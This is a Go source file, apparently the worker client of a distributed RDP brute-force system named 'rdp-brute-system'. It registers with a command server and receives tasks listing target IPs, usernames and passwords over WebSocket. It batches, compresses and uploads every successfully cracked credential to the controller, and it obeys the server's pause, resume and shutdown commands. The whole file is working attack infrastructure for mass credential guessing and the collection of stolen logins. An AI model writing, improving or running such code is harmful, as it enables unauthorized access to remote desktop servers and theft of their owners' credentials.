package comm

import (
	"bytes"
	"compress/gzip"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"runtime"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"rdp-brute-system/client/rdp"
	"rdp-brute-system/shared/protocol"
)

// Configuration constants
const (
	ResultBatchSize       = 1000              // Increased from individual results
	ResultBatchTimeout    = 200 * time.Millisecond // Batch timeout
	ResultQueueSize       = 10000             // Large buffer for results
	CompressionThreshold  = 100               // Compress batches larger than this
	MaxConcurrentRequests = 10                // Max concurrent HTTP requests
	RequestTimeout        = 30 * time.Second
	HeartbeatInterval     = 5 * time.Second
	TaskRequestInterval   = 5 * time.Second   // Reduced from 10s
	ReconnectInterval     = 5 * time.Second
	MaxReconnectAttempts  = 10
)

// APIClient is a client for the server's REST API
type APIClient struct {
	ServerURL       string
	ClientID        string
	Client          *http.Client
	requestSemaphore chan struct{} // Limit concurrent requests
}

// NewAPIClient creates a new API client with optimizations
func NewAPIClient(serverURL, clientID string) *APIClient {
	return &APIClient{
		ServerURL: serverURL,
		ClientID:  clientID,
		Client: &http.Client{
			Timeout: RequestTimeout,
			Transport: &http.Transport{
				MaxIdleConns:        100,
				MaxIdleConnsPerHost: 20,
				MaxConnsPerHost:     20,
				IdleConnTimeout:     90 * time.Second,
				DisableCompression:  false, // Enable HTTP compression
			},
		},
		requestSemaphore: make(chan struct{}, MaxConcurrentRequests),
	}
}

// Register sends a registration request to the server
func (c *APIClient) Register(req protocol.RegisterData) (*protocol.RegisterResponse, error) {
	url := c.ServerURL + "/api/v1/client/register"
	body, err := json.Marshal(req)
	if err != nil {
		return nil, err
	}

	resp, err := c.Client.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, errors.New("failed to register client: " + resp.Status)
	}

	var regResp protocol.RegisterResponse
	if err := json.NewDecoder(resp.Body).Decode(&regResp); err != nil {
		return nil, err
	}

	return &regResp, nil
}

// SendHeartbeat sends a heartbeat to the server
func (c *APIClient) SendHeartbeat(req protocol.HeartbeatData) (*protocol.HeartbeatResponse, error) {
	url := c.ServerURL + "/api/v1/client/heartbeat"
	body, err := json.Marshal(req)
	if err != nil {
		return nil, err
	}

	httpReq, err := http.NewRequest("POST", url, bytes.NewBuffer(body))
	if err != nil {
		return nil, err
	}
	httpReq.Header.Set("Content-Type", "application/json")
	httpReq.Header.Set("X-Client-ID", c.ClientID)

	resp, err := c.Client.Do(httpReq)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, errors.New("failed to send heartbeat: " + resp.Status)
	}

	var hbResp protocol.HeartbeatResponse
	if err := json.NewDecoder(resp.Body).Decode(&hbResp); err != nil {
		return nil, err
	}

	return &hbResp, nil
}

// ReportResult sends a batch of results to the server with compression
func (c *APIClient) ReportResult(req protocol.ResultReportData) (*protocol.ReportResultResponse, error) {
	// Acquire semaphore to limit concurrent requests
	c.requestSemaphore <- struct{}{}
	defer func() { <-c.requestSemaphore }()

	url := c.ServerURL + "/api/v1/client/report"
	
	// Compress large batches
	var bodyReader *bytes.Buffer
	httpReq, err := http.NewRequest("POST", url, nil)
	if err != nil {
		return nil, err
	}
	
	if len(req.Results) >= CompressionThreshold {
		// Compress the request body
		body, err := json.Marshal(req)
		if err != nil {
			return nil, err
		}
		
		var compressedBuf bytes.Buffer
		gzWriter := gzip.NewWriter(&compressedBuf)
		if _, err := gzWriter.Write(body); err != nil {
			return nil, err
		}
		if err := gzWriter.Close(); err != nil {
			return nil, err
		}
		
		bodyReader = &compressedBuf
		httpReq.Header.Set("Content-Encoding", "gzip")
	} else {
		// Send uncompressed for small batches
		body, err := json.Marshal(req)
		if err != nil {
			return nil, err
		}
		bodyReader = bytes.NewBuffer(body)
	}
	
	httpReq.Body = io.NopCloser(bodyReader)
	httpReq.ContentLength = int64(bodyReader.Len())
	httpReq.Header.Set("Content-Type", "application/json")
	httpReq.Header.Set("X-Client-ID", c.ClientID)

	resp, err := c.Client.Do(httpReq)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, errors.New("failed to report result: " + resp.Status)
	}

	var reportResp protocol.ReportResultResponse
	if err := json.NewDecoder(resp.Body).Decode(&reportResp); err != nil {
		return nil, err
	}

	return &reportResp, nil
}

// Client manages WebSocket communication with the server
type Client struct {
	serverAddr       string
	clientID         string
	conn             *websocket.Conn
	connMu           sync.RWMutex
	taskQueue        chan protocol.Task
	resultQueue      chan rdp.Result
	apiClient        *APIClient
	mu               sync.Mutex
	isRunning        bool
	hostname         string
	maxThreads       int
	
	// Optimized result processing
	resultBatcher    *ResultBatcher
	
	// Performance metrics
	totalAttempts    int64
	successCount     int64
	currentPPS       int64
	
	// Task tracking
	activeTasks      sync.Map
	taskCompletions  chan string
	
	// Reconnection handling
	reconnectAttempts int
	
	// Operation control
	isPaused         bool
	pauseMu          sync.RWMutex
	gracefulStopChan chan struct{}
}

// ResultBatcher handles efficient batching and compression of results
type ResultBatcher struct {
	client          *Client
	batch           []protocol.Result
	batchMu         sync.Mutex
	flushTimer      *time.Timer
	processingQueue chan []protocol.Result
	workers         sync.WaitGroup
}

// NewResultBatcher creates a new result batcher
func NewResultBatcher(client *Client) *ResultBatcher {
	rb := &ResultBatcher{
		client:          client,
		batch:           make([]protocol.Result, 0, ResultBatchSize),
		processingQueue: make(chan []protocol.Result, 100),
	}
	
	// Start async processing workers
	for i := 0; i < 5; i++ {
		rb.workers.Add(1)
		go rb.processWorker()
	}
	
	return rb
}

// Add adds a result to the batch
func (rb *ResultBatcher) Add(result rdp.Result) {
	if !result.Success {
		return // Only batch successful results
	}
	
	rb.batchMu.Lock()
	defer rb.batchMu.Unlock()
	
	protoResult := protocol.Result{
		IP:       result.IP,
		Port:     result.Port,
		Username: result.Username,
		Password: result.Password,
		Found:    protocol.JSONTime{Time: time.Now()},
	}
	
	rb.batch = append(rb.batch, protoResult)
	
	// Flush if batch is full
	if len(rb.batch) >= ResultBatchSize {
		rb.flushLocked()
	} else if rb.flushTimer == nil {
		// Start flush timer
		rb.flushTimer = time.AfterFunc(ResultBatchTimeout, rb.Flush)
	}
}

// Flush sends the current batch
func (rb *ResultBatcher) Flush() {
	rb.batchMu.Lock()
	defer rb.batchMu.Unlock()
	rb.flushLocked()
}

// flushLocked flushes the batch (must be called with lock held)
func (rb *ResultBatcher) flushLocked() {
	if len(rb.batch) == 0 {
		return
	}
	
	// Cancel timer if running
	if rb.flushTimer != nil {
		rb.flushTimer.Stop()
		rb.flushTimer = nil
	}
	
	// Send batch to processing queue
	batchCopy := make([]protocol.Result, len(rb.batch))
	copy(batchCopy, rb.batch)
	
	select {
	case rb.processingQueue <- batchCopy:
		rb.batch = rb.batch[:0] // Clear batch
	default:
		log.Printf("Warning: Result processing queue full, keeping batch")
	}
}

// processWorker processes batches asynchronously
func (rb *ResultBatcher) processWorker() {
	defer rb.workers.Done()
	
	for batch := range rb.processingQueue {
		if len(batch) == 0 {
			continue
		}
		
		// Find associated task ID (simplified - in production track per result)
		taskID := "current-task"
		rb.client.activeTasks.Range(func(key, value interface{}) bool {
			taskID = key.(string)
			return false // Just get first task
		})
		
		reportData := protocol.ResultReportData{
			TaskID:   taskID,
			Results:  batch,
			Attempts: int64(len(batch)), // Simplified
			Duration: 0,
		}
		
		// Retry logic for failed reports
		maxRetries := 3
		for attempt := 0; attempt < maxRetries; attempt++ {
			_, err := rb.client.apiClient.ReportResult(reportData)
			if err == nil {
				log.Printf("Successfully reported batch of %d results", len(batch))
				atomic.AddInt64(&rb.client.successCount, int64(len(batch)))
				break
			}
			
			if attempt < maxRetries-1 {
				log.Printf("Failed to report batch (attempt %d/%d): %v", attempt+1, maxRetries, err)
				time.Sleep(time.Duration(attempt+1) * time.Second)
			} else {
				log.Printf("Failed to report batch after %d attempts: %v", maxRetries, err)
			}
		}
	}
}

// Stop stops the result batcher
func (rb *ResultBatcher) Stop() {
	rb.Flush() // Flush any remaining results
	close(rb.processingQueue)
	rb.workers.Wait()
}

// New creates a new WebSocket client
func New(serverAddr string, taskQueue chan protocol.Task, resultQueue chan rdp.Result) (*Client, error) {
	clientID := uuid.New().String()
	hostname := getHostname()
	
	// Create API client for REST endpoints
	apiClient := NewAPIClient(fmt.Sprintf("http://%s", serverAddr), clientID)
	
	// Register with the server
	regData := protocol.RegisterData{
		Hostname:   hostname,
		OS:         runtime.GOOS,
		CPUCores:   runtime.NumCPU(),
		MaxThreads: 200, // Increased default
		Version:    "2.0.0", // Updated version
	}
	
	regResp, err := apiClient.Register(regData)
	if err != nil {
		return nil, fmt.Errorf("failed to register: %v", err)
	}
	
	// Use the server-assigned client ID
	clientID = regResp.ClientID
	apiClient.ClientID = clientID
	
	client := &Client{
		serverAddr:      serverAddr,
		clientID:        clientID,
		taskQueue:       taskQueue,
		resultQueue:     resultQueue,
		apiClient:       apiClient,
		hostname:        hostname,
		maxThreads:      200,
		taskCompletions: make(chan string, 100),
	}
	
	// Create result batcher
	client.resultBatcher = NewResultBatcher(client)
	
	// Initialize graceful stop channel
	client.gracefulStopChan = make(chan struct{})
	
	// Connect WebSocket
	if err := client.connectWebSocket(); err != nil {
		return nil, err
	}
	
	log.Printf("Connected to server with client ID: %s", clientID)
	return client, nil
}

// connectWebSocket establishes or re-establishes WebSocket connection
func (c *Client) connectWebSocket() error {
	wsURL := fmt.Sprintf("ws://%s/ws", c.serverAddr)
	
	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		ReadBufferSize:   4096,
		WriteBufferSize:  4096,
	}
	
	conn, _, err := dialer.Dial(wsURL, nil)
	if err != nil {
		return fmt.Errorf("failed to connect WebSocket: %v", err)
	}
	
	c.connMu.Lock()
	c.conn = conn
	c.connMu.Unlock()
	
	// Reset reconnection attempts on successful connection
	c.reconnectAttempts = 0
	
	return nil
}

// Start begins the client's communication loops
func (c *Client) Start() {
	c.mu.Lock()
	c.isRunning = true
	c.mu.Unlock()
	
	// Start heartbeat loop
	go c.heartbeatLoop()
	
	// Start task request loop
	go c.taskRequestLoop()
	
	// Start result processing loop with multiple workers
	for i := 0; i < 3; i++ {
		go c.resultProcessLoop()
	}
	
	// Start WebSocket message handler
	go c.handleMessages()
	
	// Start task completion handler
	go c.taskCompletionHandler()
	
	// Start metrics reporter
	go c.metricsReporter()
}

// Stop gracefully shuts down the client
func (c *Client) Stop() {
	c.mu.Lock()
	c.isRunning = false
	c.mu.Unlock()
	
	// Stop result batcher
	c.resultBatcher.Stop()
	
	c.connMu.Lock()
	if c.conn != nil {
		c.conn.Close()
	}
	c.connMu.Unlock()
	
	log.Println("Client stopped")
}

// heartbeatLoop sends periodic heartbeats to the server
func (c *Client) heartbeatLoop() {
	ticker := time.NewTicker(HeartbeatInterval)
	defer ticker.Stop()
	
	for c.isRunning {
		select {
		case <-ticker.C:
			// Calculate active tasks
			activeTaskCount := 0
			c.activeTasks.Range(func(_, _ interface{}) bool {
				activeTaskCount++
				return true
			})
			
			hbData := protocol.HeartbeatData{
				ActiveThreads: c.maxThreads,
				PPS:          float64(atomic.LoadInt64(&c.currentPPS)),
				TotalAttempts: atomic.LoadInt64(&c.totalAttempts),
				SuccessCount:  int(atomic.LoadInt64(&c.successCount)),
			}
			
			_, err := c.apiClient.SendHeartbeat(hbData)
			if err != nil {
				log.Printf("Failed to send heartbeat: %v", err)
			}
		}
	}
}

// taskRequestLoop periodically requests new tasks from the server
func (c *Client) taskRequestLoop() {
	ticker := time.NewTicker(TaskRequestInterval)
	defer ticker.Stop()
	
	// Request immediately on start
	c.requestTasks()
	
	for c.isRunning {
		select {
		case <-ticker.C:
			// Check if we need more tasks
			if len(c.taskQueue) < cap(c.taskQueue)/2 {
				c.requestTasks()
			}
		case <-c.taskCompletions:
			// Task completed, request more immediately
			c.requestTasks()
		}
	}
}

// requestTasks sends a task request to the server via WebSocket
func (c *Client) requestTasks() {
	// Check if paused
	c.pauseMu.RLock()
	if c.isPaused {
		c.pauseMu.RUnlock()
		return
	}
	c.pauseMu.RUnlock()
	
	// Calculate how many tasks we can handle
	activeTaskCount := 0
	c.activeTasks.Range(func(_, _ interface{}) bool {
		activeTaskCount++
		return true
	})
	
	maxTasks := 10 - activeTaskCount
	if maxTasks <= 0 {
		return
	}
	
	reqData := protocol.TaskRequestData{
		MaxTasks:      maxTasks,
		PreferredSize: 50, // Optimal target count per task
	}
	
	data, _ := json.Marshal(reqData)
	msg := protocol.Message{
		Type:      protocol.MsgTaskRequest,
		ClientID:  c.clientID,
		Timestamp: protocol.JSONTime{Time: time.Now()},
		Data:      data,
	}
	
	c.sendMessage(msg)
}

// sendMessage sends a message via WebSocket with reconnection handling
func (c *Client) sendMessage(msg protocol.Message) error {
	c.connMu.RLock()
	conn := c.conn
	c.connMu.RUnlock()
	
	if conn == nil {
		return fmt.Errorf("no connection")
	}
	
	err := conn.WriteJSON(msg)
	if err != nil {
		log.Printf("Failed to send message: %v", err)
		// Trigger reconnection
		go c.reconnect()
		return err
	}
	
	return nil
}

// reconnect attempts to reconnect to the server
func (c *Client) reconnect() {
	c.mu.Lock()
	if c.reconnectAttempts >= MaxReconnectAttempts {
		log.Printf("Max reconnection attempts reached, giving up")
		c.isRunning = false
		c.mu.Unlock()
		return
	}
	c.reconnectAttempts++
	c.mu.Unlock()
	
	log.Printf("Attempting to reconnect (attempt %d/%d)...", c.reconnectAttempts, MaxReconnectAttempts)
	
	time.Sleep(ReconnectInterval)
	
	if err := c.connectWebSocket(); err != nil {
		log.Printf("Reconnection failed: %v", err)
		go c.reconnect() // Try again
		return
	}
	
	log.Println("Reconnected successfully")
	
	// Restart message handler
	go c.handleMessages()
}

// resultProcessLoop processes results from the worker queue
func (c *Client) resultProcessLoop() {
	for c.isRunning {
		select {
		case result := <-c.resultQueue:
			// Update metrics
			atomic.AddInt64(&c.totalAttempts, 1)
			
			// Add to batcher
			c.resultBatcher.Add(result)
			
		case <-time.After(100 * time.Millisecond):
			// Periodic check to avoid blocking
		}
	}
}

// handleMessages handles incoming WebSocket messages
func (c *Client) handleMessages() {
	c.connMu.RLock()
	conn := c.conn
	c.connMu.RUnlock()
	
	if conn == nil {
		return
	}
	
	for c.isRunning {
		var msg protocol.Message
		err := conn.ReadJSON(&msg)
		if err != nil {
			log.Printf("WebSocket read error: %v", err)
			go c.reconnect()
			return
		}
		
		switch msg.Type {
		case protocol.MsgTaskAssign:
			var taskData protocol.TaskAssignData
			if err := json.Unmarshal(msg.Data, &taskData); err != nil {
				log.Printf("Failed to unmarshal task data: %v", err)
				continue
			}
			
			// Add tasks to the queue
			for _, task := range taskData.Tasks {
				// Track active task
				c.activeTasks.Store(task.ID, true)
				
				select {
				case c.taskQueue <- task:
					log.Printf("Received task %s with %d IPs, %d usernames, %d passwords", 
						task.ID, len(task.IPs), len(task.Usernames), len(task.Passwords))
				default:
					log.Printf("Task queue full, dropping task %s", task.ID)
					c.activeTasks.Delete(task.ID)
				}
			}
			
		case protocol.MsgConfigUpdate:
			var configData protocol.ConfigUpdateData
			if err := json.Unmarshal(msg.Data, &configData); err != nil {
				log.Printf("Failed to unmarshal config data: %v", err)
				continue
			}
			
			if configData.MaxThreads > 0 {
				c.maxThreads = configData.MaxThreads
				log.Printf("Updated max threads to %d", c.maxThreads)
			}
			
		case protocol.MsgShutdown:
			log.Println("Received shutdown command from server")
			c.Stop()
			return
			
		case protocol.MsgOperationStop:
			var opData protocol.OperationCommandData
			if err := json.Unmarshal(msg.Data, &opData); err != nil {
				log.Printf("Failed to unmarshal operation command data: %v", err)
				continue
			}
			
			log.Printf("Received operation stop command for operation %s (graceful: %v)",
				opData.OperationID, opData.Graceful)
			
			if opData.Graceful {
				// Graceful shutdown - finish current work
				c.handleGracefulStop()
			} else {
				// Immediate stop
				c.Stop()
			}
			return
			
		case protocol.MsgOperationPause:
			var opData protocol.OperationCommandData
			if err := json.Unmarshal(msg.Data, &opData); err != nil {
				log.Printf("Failed to unmarshal operation command data: %v", err)
				continue
			}
			
			log.Printf("Received operation pause command for operation %s", opData.OperationID)
			c.handlePause()
			
		case protocol.MsgOperationResume:
			var opData protocol.OperationCommandData
			if err := json.Unmarshal(msg.Data, &opData); err != nil {
				log.Printf("Failed to unmarshal operation command data: %v", err)
				continue
			}
			
			log.Printf("Received operation resume command for operation %s", opData.OperationID)
			c.handleResume()
		}
	}
}

// taskCompletionHandler handles task completion notifications
func (c *Client) taskCompletionHandler() {
	for taskID := range c.taskCompletions {
		c.activeTasks.Delete(taskID)
		
		// Notify task request loop
		select {
		case c.taskCompletions <- taskID:
		default:
		}
	}
}

// metricsReporter periodically reports performance metrics
func (c *Client) metricsReporter() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	var lastAttempts int64
	
	for c.isRunning {
		select {
		case <-ticker.C:
			currentAttempts := atomic.LoadInt64(&c.totalAttempts)
			pps := currentAttempts - lastAttempts
			atomic.StoreInt64(&c.currentPPS, pps)
			lastAttempts = currentAttempts
			
			if pps > 0 {
				successCount := atomic.LoadInt64(&c.successCount)
				log.Printf("Performance: %d checks/sec, %d total attempts, %d successes", 
					pps, currentAttempts, successCount)
			}
		}
	}
}

// CompleteTask marks a task as completed
func (c *Client) CompleteTask(taskID string) {
	select {
	case c.taskCompletions <- taskID:
	default:
	}
}

// SendStatus updates current PPS status (called from main)
func (c *Client) SendStatus(pps int) {
	atomic.StoreInt64(&c.currentPPS, int64(pps))
}

// getHostname returns the machine's hostname
func getHostname() string {
	hostname, err := http.Get("http://169.254.169.254/latest/meta-data/hostname")
	if err == nil && hostname.StatusCode == 200 {
		defer hostname.Body.Close()
		buf := new(bytes.Buffer)
		buf.ReadFrom(hostname.Body)
		return buf.String()
	}
	
	// Fallback to local hostname
	return "worker-" + uuid.New().String()[:8]
}

// handleGracefulStop performs a graceful shutdown
func (c *Client) handleGracefulStop() {
	log.Println("Starting graceful shutdown...")
	
	// Stop accepting new tasks
	c.pauseMu.Lock()
	c.isPaused = true
	c.pauseMu.Unlock()
	
	// Wait for active tasks to complete
	maxWaitTime := 5 * time.Minute
	checkInterval := 5 * time.Second
	startTime := time.Now()
	
	for {
		activeCount := 0
		c.activeTasks.Range(func(_, _ interface{}) bool {
			activeCount++
			return true
		})
		
		if activeCount == 0 {
			log.Println("All tasks completed, shutting down")
			break
		}
		
		if time.Since(startTime) > maxWaitTime {
			log.Printf("Graceful shutdown timeout reached, %d tasks still active", activeCount)
			break
		}
		
		log.Printf("Waiting for %d active tasks to complete...", activeCount)
		time.Sleep(checkInterval)
	}
	
	// Flush any remaining results
	c.resultBatcher.Flush()
	
	// Signal graceful stop complete
	close(c.gracefulStopChan)
	
	// Stop the client
	c.Stop()
}

// handlePause pauses task processing
func (c *Client) handlePause() {
	c.pauseMu.Lock()
	c.isPaused = true
	c.pauseMu.Unlock()
	
	log.Println("Client paused - not accepting new tasks")
}

// handleResume resumes task processing
func (c *Client) handleResume() {
	c.pauseMu.Lock()
	c.isPaused = false
	c.pauseMu.Unlock()
	
	log.Println("Client resumed - accepting new tasks")
	
	// Request tasks immediately
	go c.requestTasks()
}

// IsGracefullyStopping returns true if the client is in graceful shutdown
func (c *Client) IsGracefullyStopping() bool {
	select {
	case <-c.gracefulStopChan:
		return true
	default:
		return false
	}
}
